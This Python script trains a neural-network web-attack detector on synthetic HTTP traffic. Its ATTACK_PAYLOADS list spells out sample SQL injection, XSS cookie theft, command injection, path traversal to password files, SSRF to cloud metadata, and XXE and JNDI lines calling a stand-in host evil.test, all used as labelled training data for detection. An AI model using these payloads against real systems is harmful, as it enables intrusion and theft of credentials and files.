import argparse
import csv
import json
import random
import shutil
from datetime import datetime
from pathlib import Path

import joblib
import numpy as np
import pandas as pd
import torch
import torch.nn as nn
from sklearn.metrics import accuracy_score, classification_report, confusion_matrix, f1_score, precision_score, recall_score, roc_auc_score
from sklearn.model_selection import train_test_split
from torch.utils.data import DataLoader, TensorDataset

from extract_old_model_features_from_txt import build_numeric_value, choose_category, load_preprocessor_schema


SCRIPT_DIR = Path(__file__).resolve().parent
PROJECT_ROOT = SCRIPT_DIR.parent


class MLP(nn.Module):
    def __init__(self, input_dim):
        super().__init__()
        self.net = nn.Sequential(
            nn.Linear(input_dim, 256),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(256, 128),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(128, 64),
            nn.ReLU(),
            nn.Dropout(0.2),
            nn.Linear(64, 1),
        )

    def forward(self, x):
        return self.net(x)


def set_seed(seed: int) -> None:
    random.seed(seed)
    np.random.seed(seed)
    torch.manual_seed(seed)
    if torch.cuda.is_available():
        torch.cuda.manual_seed_all(seed)


def json_body(**kwargs) -> str:
    return json.dumps(kwargs, ensure_ascii=False, separators=(",", ":"))


BENIGN_TEMPLATES = [
    ("GET", "/"),
    ("GET", "/home"),
    ("GET", "/api/products?q={word}&page={num}"),
    ("GET", "/api/search?q={word}"),
    ("GET", "/api/articles/{num}"),
    ("GET", "/api/orders?status={status}"),
    ("GET", "/api/profile?id={num}"),
    ("POST", "/api/auth/login"),
    ("POST", "/api/comment"),
    ("POST", "/api/upload/avatar"),
    ("POST", "/api/graphql"),
    ("POST", "/api/xml/import"),
    ("POST", "/api/fetch"),
]


ATTACK_PAYLOADS = {
    "sql_injection": [
        "' or 1=1 -- ",
        "admin' UNION SELECT username,password FROM users--",
        "' OR 'a'='a",
        "1 AND SLEEP(3)",
        "'; SELECT * FROM information_schema.tables--",
        "1' AND benchmark(200000,md5(1))--",
        "1/**/OR/**/1=1#",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(document.cookie)>",
        "javascript:alert(1)",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "<body onload=alert(1)>",
    ],
    "command_injection": [
        "127.0.0.1; cat /etc/passwd",
        "localhost && whoami",
        "8.8.8.8 | id",
        "test || powershell whoami",
        "127.0.0.1; curl http://evil.test/a",
    ],
    "path_traversal": [
        "../../../../../etc/passwd",
        "..\\..\\..\\Windows\\System32\\config\\SAM",
        "/download?file=../../../../etc/shadow",
        "..%2f..%2f..%2fetc%2fpasswd",
    ],
    "ssrf": [
        "http://127.0.0.1:8080/admin",
        "http://localhost:3306/",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "http://192.168.1.1/router",
    ],
    "malicious_upload": [
        "shell.php",
        "cmd.jsp",
        "webshell.aspx",
        "run.ps1",
        "payload.sh",
    ],
    "xxe": [
        "<?xml version='1.0'?><!DOCTYPE a [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><a>&xxe;</a>",
        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.test/xxe.dtd'>%xxe;]>",
    ],
    "ssti": [
        "{{config.__class__.__init__.__globals__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "${jndi:ldap://evil.test/a}",
        "${runtime.getruntime().exec('id')}",
    ],
    "deserialization": [
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==",
        "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"pwn\";}",
        "ysoserial CommonsCollections1 calc.exe",
    ],
    "graphql_abuse": [
        "{__schema{types{name fields{name}}}}",
        "mutation { resetPassword(userId:1,password:\"pwned\") }",
        "{user(id:1){id username password token __typename}}",
    ],
    "bruteforce": [
        "admin:123456",
        "root:password",
        "administrator:qwerty",
        "test:111111",
    ],
}


def make_response(status_code: int, body: str, frame_no: int, request_frame: int, time_value: float) -> dict:
    return {
        "frame_no": frame_no,
        "time": time_value,
        "src_ip": "10.10.0.10",
        "dst_ip": "203.0.113.10",
        "src_port": 80,
        "dst_port": 50000 + (request_frame % 1000),
        "raw_block": f"HTTP/1.1 {status_code} OK\nBody:\n{body}",
        "type": "response",
        "status_code": status_code,
        "request_frame": request_frame,
        "response_body_excerpt": body,
        "_response_text": f"RESPONSE_EXCERPT={body}",
    }


def make_request(method: str, uri: str, body: str, frame_no: int, response_frame: int, content_type: str = "application/json") -> dict:
    return {
        "frame_no": frame_no,
        "time": float(frame_no) / 100.0,
        "src_ip": f"203.0.113.{10 + frame_no % 190}",
        "dst_ip": "10.10.0.10",
        "src_port": 50000 + (frame_no % 1000),
        "dst_port": 80,
        "raw_block": f"{method} {uri} HTTP/1.1\nHost: target.local\nContent-Type: {content_type}\nBody:\n{body}",
        "type": "request",
        "method": method,
        "uri": uri,
        "host": "target.local",
        "full_uri": f"http://target.local{uri}",
        "user_agent": "Mozilla/5.0 SyntheticBrowser/1.0",
        "content_type": content_type,
        "response_frame": response_frame,
        "request_body": body,
        "_request_text": "\n".join(
            [
                f"METHOD={method}",
                f"URI={uri}",
                "HOST=target.local",
                f"CONTENT_TYPE={content_type}",
                f"REQUEST_BODY={body}",
            ]
        ),
    }


def build_feature_row(sample_id: int, req: dict, resp: dict, numeric_cols, categorical_cols, categorical_choices) -> dict:
    row = {"file_id": f"syn.{sample_id}", "seq_id": 1}
    for col in categorical_cols:
        row[col] = choose_category(col, categorical_choices, req, resp)
    for col in numeric_cols:
        row[col] = build_numeric_value(col, req, resp)
    return row


def make_benign_sample(sample_id: int, rng: random.Random):
    method, uri_tmpl = rng.choice(BENIGN_TEMPLATES)
    word = rng.choice(["phone", "book", "admin-guide", "report", "summer", "normal", "javascript-tutorial"])
    status = rng.choice(["pending", "paid", "closed", "draft"])
    uri = uri_tmpl.format(word=word, num=rng.randint(1, 9999), status=status)

    content_type = "application/json"
    if method == "GET":
        body = ""
        status_code = rng.choice([200, 200, 200, 304, 404])
        response_body = json_body(ok=True, items=rng.randint(0, 20))
    elif uri == "/api/auth/login":
        ok = rng.random() > 0.35
        status_code = 200 if ok else 401
        if ok:
            username = rng.choice(["alice", "bob", "admin", "guest"])
            password = rng.choice(["Pass2026!", "Welcome123", "CorrectHorse99", "admin"])
        else:
            # A single bad password is a normal business failure, not an attack by itself.
            username = rng.choice(["alice", "bob", "admin", "guest", "test"])
            password = rng.choice(["123", "123456", "admin", "password", "wrong-pass"])
        body = json_body(username=username, password=password)
        response_body = json_body(ok=ok, message="login ok" if ok else "invalid credentials")
    elif uri == "/api/comment":
        body = json_body(text=rng.choice(["hello world", "nice article", "I like JavaScript tutorials", "normal feedback"]))
        status_code = 201
        response_body = json_body(ok=True)
    elif uri == "/api/upload/avatar":
        filename = rng.choice(["avatar.png", "photo.jpg", "report.pdf"])
        body = f'Content-Disposition: form-data; name="file"; filename="{filename}"'
        content_type = "multipart/form-data"
        status_code = 201
        response_body = json_body(ok=True, filename=filename)
    elif uri == "/api/graphql":
        body = json_body(query="{ viewer { id username displayName } }")
        status_code = 200
        response_body = json_body(data={"viewer": {"id": rng.randint(1, 99)}})
    elif uri == "/api/xml/import":
        body = "<note><title>hello</title><body>normal</body></note>"
        content_type = "application/xml"
        status_code = 200
        response_body = json_body(ok=True)
    elif uri == "/api/fetch":
        body = json_body(url=rng.choice(["https://example.com/logo.png", "https://docs.python.org/", "https://openai.com/"]))
        status_code = 200
        response_body = json_body(ok=True)
    else:
        body = json_body(value=word)
        status_code = 200
        response_body = json_body(ok=True)

    req = make_request(method, uri, body, sample_id * 2, sample_id * 2 + 1, content_type)
    resp = make_response(status_code, response_body, sample_id * 2 + 1, sample_id * 2, req["time"] + rng.uniform(0.01, 0.4))
    return req, resp, "benign", 0


def make_attack_sample(sample_id: int, rng: random.Random, attack_type: str):
    payload = rng.choice(ATTACK_PAYLOADS[attack_type])
    method = "POST"
    uri = "/api/auth/login"
    content_type = "application/json"
    status_code = rng.choice([400, 403, 500, 504])

    if attack_type == "sql_injection":
        body = json_body(username="admin", password=payload)
        response_body = json_body(error="database error")
    elif attack_type == "xss":
        body = json_body(username="admin", password=payload)
        response_body = json_body(error="server error")
    elif attack_type == "command_injection":
        uri = "/api/system/ping"
        body = json_body(host=payload)
        response_body = json_body(error="command rejected")
    elif attack_type == "path_traversal":
        method = "GET"
        uri = f"/api/file/read?path={payload}"
        body = ""
        response_body = json_body(error="file access denied")
    elif attack_type == "ssrf":
        uri = "/api/fetch"
        body = json_body(url=payload)
        response_body = json_body(error="internal target blocked")
    elif attack_type == "malicious_upload":
        uri = "/api/upload"
        content_type = "multipart/form-data"
        body = f'Content-Disposition: form-data; name="file"; filename="{payload}"'
        response_body = json_body(error="dangerous file extension")
    elif attack_type == "xxe":
        uri = "/api/xml/import"
        content_type = "application/xml"
        body = payload
        response_body = json_body(error="external entity blocked")
    elif attack_type == "ssti":
        uri = "/api/template/render"
        body = json_body(template=payload)
        response_body = json_body(error="template sandbox violation")
    elif attack_type == "deserialization":
        uri = "/api/deserialize"
        body = json_body(blob=payload)
        response_body = json_body(error="unsafe serialized object")
    elif attack_type == "graphql_abuse":
        uri = "/api/graphql"
        body = json_body(query=payload)
        response_body = json_body(error="graphql policy violation")
    elif attack_type == "bruteforce":
        username, password = payload.split(":", 1)
        attempts = rng.randint(8, 40)
        body = json_body(username=username, password=password, attempts=attempts)
        response_body = json_body(error="ErrAuth: too many failed login attempts", attempts=attempts)
        status_code = rng.choice([403, 429, 429])
    else:
        body = json_body(payload=payload)
        response_body = json_body(error="blocked")

    req = make_request(method, uri, body, sample_id * 2, sample_id * 2 + 1, content_type)
    resp = make_response(status_code, response_body, sample_id * 2 + 1, sample_id * 2, req["time"] + rng.uniform(0.01, 0.8))
    return req, resp, attack_type, 1


def generate_dataset(args, numeric_cols, categorical_cols, categorical_choices):
    rng = random.Random(args.seed)
    feature_rows = []
    labels = []
    attack_types = []
    raw_rows = []
    sample_id = 1

    for _ in range(args.benign_samples):
        req, resp, attack_type, label = make_benign_sample(sample_id, rng)
        feature_rows.append(build_feature_row(sample_id, req, resp, numeric_cols, categorical_cols, categorical_choices))
        labels.append(label)
        attack_types.append(attack_type)
        raw_rows.append({"sample_id": sample_id, "attack_type": attack_type, "label": label, "request_text": req["_request_text"], "response_text": resp["_response_text"]})
        sample_id += 1

    for attack_type in ATTACK_PAYLOADS:
        for _ in range(args.samples_per_attack_type):
            req, resp, kind, label = make_attack_sample(sample_id, rng, attack_type)
            feature_rows.append(build_feature_row(sample_id, req, resp, numeric_cols, categorical_cols, categorical_choices))
            labels.append(label)
            attack_types.append(kind)
            raw_rows.append({"sample_id": sample_id, "attack_type": kind, "label": label, "request_text": req["_request_text"], "response_text": resp["_response_text"]})
            sample_id += 1

    return pd.DataFrame(feature_rows), np.array(labels, dtype=np.float32), np.array(attack_types), raw_rows


def evaluate_scores(y_true, scores, threshold):
    pred = (scores >= threshold).astype(int)
    metrics = {
        "threshold": threshold,
        "accuracy": float(accuracy_score(y_true, pred)),
        "precision": float(precision_score(y_true, pred, zero_division=0)),
        "recall": float(recall_score(y_true, pred, zero_division=0)),
        "f1": float(f1_score(y_true, pred, zero_division=0)),
        "confusion_matrix": confusion_matrix(y_true, pred).tolist(),
    }
    try:
        metrics["roc_auc"] = float(roc_auc_score(y_true, scores))
    except Exception:
        metrics["roc_auc"] = None
    return metrics, pred


def per_type_metrics(types, y_true, scores, pred):
    rows = []
    for kind in sorted(set(types)):
        mask = types == kind
        if not np.any(mask):
            continue
        expected = int(round(float(np.mean(y_true[mask]))))
        if expected == 0:
            success = float(np.mean(pred[mask] == 0))
        else:
            success = float(np.mean(pred[mask] == 1))
        rows.append(
            {
                "type": kind,
                "count": int(np.sum(mask)),
                "expected_label": expected,
                "success_rate": round(success, 6),
                "avg_score": round(float(np.mean(scores[mask])), 6),
                "min_score": round(float(np.min(scores[mask])), 6),
                "max_score": round(float(np.max(scores[mask])), 6),
            }
        )
    return rows


def write_csv(path: Path, rows):
    if not rows:
        return
    with path.open("w", encoding="utf-8-sig", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        writer.writeheader()
        writer.writerows(rows)


def main():
    parser = argparse.ArgumentParser(description="Train old-compatible MLP on synthetic classic web vulnerability data.")
    parser.add_argument("--preprocessor", default=str(PROJECT_ROOT / "models" / "preprocessor.joblib"))
    parser.add_argument("--base-model", default=str(PROJECT_ROOT / "models" / "best_mlp.pth"))
    parser.add_argument("--output-dir", default=str(PROJECT_ROOT / "output" / "synthetic_web_mlp_training"))
    parser.add_argument("--model-output", default="")
    parser.add_argument("--seed", type=int, default=20260604)
    parser.add_argument("--benign-samples", type=int, default=6000)
    parser.add_argument("--samples-per-attack-type", type=int, default=650)
    parser.add_argument("--epochs", type=int, default=35)
    parser.add_argument("--batch-size", type=int, default=256)
    parser.add_argument("--learning-rate", type=float, default=1e-3)
    parser.add_argument("--threshold", type=float, default=0.46)
    parser.add_argument("--install", action="store_true", help="Backup and replace models/best_mlp.pth when metrics are acceptable.")
    parser.add_argument("--min-accuracy", type=float, default=0.98)
    parser.add_argument("--min-recall", type=float, default=0.98)
    args = parser.parse_args()

    set_seed(args.seed)

    preprocessor_path = Path(args.preprocessor).resolve()
    base_model_path = Path(args.base_model).resolve()
    run_dir = Path(args.output_dir).resolve() / datetime.now().strftime("%Y%m%d_%H%M%S")
    run_dir.mkdir(parents=True, exist_ok=True)
    model_output = Path(args.model_output).resolve() if args.model_output else run_dir / "best_mlp_web_synthetic.pth"

    preprocessor = joblib.load(preprocessor_path)
    numeric_cols, categorical_cols, categorical_choices = load_preprocessor_schema(preprocessor)

    feature_df, labels, attack_types, raw_rows = generate_dataset(args, numeric_cols, categorical_cols, categorical_choices)
    required_cols = categorical_cols + numeric_cols
    X = preprocessor.transform(feature_df[required_cols])
    X = X.toarray() if hasattr(X, "toarray") else X
    X = X.astype(np.float32)

    idx = np.arange(len(labels))
    train_idx, temp_idx = train_test_split(idx, test_size=0.3, random_state=args.seed, stratify=labels)
    val_idx, test_idx = train_test_split(temp_idx, test_size=0.5, random_state=args.seed, stratify=labels[temp_idx])

    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    model = MLP(X.shape[1]).to(device)
    if base_model_path.exists():
        model.load_state_dict(torch.load(base_model_path, map_location=device))

    pos_count = float(np.sum(labels[train_idx] == 1))
    neg_count = float(np.sum(labels[train_idx] == 0))
    pos_weight = torch.tensor([neg_count / max(pos_count, 1.0)], dtype=torch.float32).to(device)
    criterion = nn.BCEWithLogitsLoss(pos_weight=pos_weight)
    optimizer = torch.optim.Adam(model.parameters(), lr=args.learning_rate, weight_decay=1e-5)

    train_ds = TensorDataset(torch.tensor(X[train_idx]), torch.tensor(labels[train_idx]).view(-1, 1))
    train_loader = DataLoader(train_ds, batch_size=args.batch_size, shuffle=True)

    X_val = torch.tensor(X[val_idx], dtype=torch.float32).to(device)
    y_val = labels[val_idx]
    best_state = None
    best_f1 = -1.0
    history = []

    for epoch in range(1, args.epochs + 1):
        model.train()
        losses = []
        for xb, yb in train_loader:
            xb = xb.to(device)
            yb = yb.to(device)
            optimizer.zero_grad(set_to_none=True)
            logits = model(xb)
            loss = criterion(logits, yb)
            loss.backward()
            optimizer.step()
            losses.append(float(loss.detach().cpu().item()))

        model.eval()
        with torch.no_grad():
            val_scores = torch.sigmoid(model(X_val)).detach().cpu().numpy().reshape(-1)
        val_metrics, _ = evaluate_scores(y_val.astype(int), val_scores, args.threshold)
        history.append({"epoch": epoch, "loss": float(np.mean(losses)), **val_metrics})
        if val_metrics["f1"] > best_f1:
            best_f1 = val_metrics["f1"]
            best_state = {k: v.detach().cpu().clone() for k, v in model.state_dict().items()}
        print(f"epoch={epoch:03d} loss={np.mean(losses):.6f} val_acc={val_metrics['accuracy']:.4f} val_recall={val_metrics['recall']:.4f} val_f1={val_metrics['f1']:.4f}")

    if best_state is not None:
        model.load_state_dict(best_state)

    model.eval()
    with torch.no_grad():
        test_scores = torch.sigmoid(model(torch.tensor(X[test_idx], dtype=torch.float32).to(device))).detach().cpu().numpy().reshape(-1)
    test_metrics, test_pred = evaluate_scores(labels[test_idx].astype(int), test_scores, args.threshold)
    type_rows = per_type_metrics(attack_types[test_idx], labels[test_idx].astype(int), test_scores, test_pred)

    torch.save(model.state_dict(), model_output)
    feature_df.assign(label=labels.astype(int), attack_type=attack_types).to_csv(run_dir / "synthetic_features.csv", index=False, encoding="utf-8-sig")
    write_csv(run_dir / "raw_samples.csv", raw_rows)
    write_csv(run_dir / "per_type_metrics.csv", type_rows)
    (run_dir / "metrics.json").write_text(json.dumps({"test": test_metrics, "per_type": type_rows, "history": history}, ensure_ascii=False, indent=2), encoding="utf-8")
    (run_dir / "classification_report.txt").write_text(
        classification_report(labels[test_idx].astype(int), test_pred, target_names=["benign", "suspicious"], digits=4, zero_division=0),
        encoding="utf-8",
    )

    print("=" * 80)
    print("training output:", run_dir)
    print("model output:", model_output)
    print("test metrics:", json.dumps(test_metrics, ensure_ascii=False, indent=2))
    print("per-type success:")
    for row in type_rows:
        print(row)

    ok = test_metrics["accuracy"] >= args.min_accuracy and test_metrics["recall"] >= args.min_recall
    if args.install:
        if not ok:
            raise RuntimeError(f"Metrics below install gate: accuracy={test_metrics['accuracy']:.4f} recall={test_metrics['recall']:.4f}")
        target = PROJECT_ROOT / "models" / "best_mlp.pth"
        backup = PROJECT_ROOT / "models" / f"best_mlp_legacy_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pth"
        shutil.copy2(target, backup)
        shutil.copy2(model_output, target)
        print("installed model:", target)
        print("backup model:", backup)


if __name__ == "__main__":
    main()
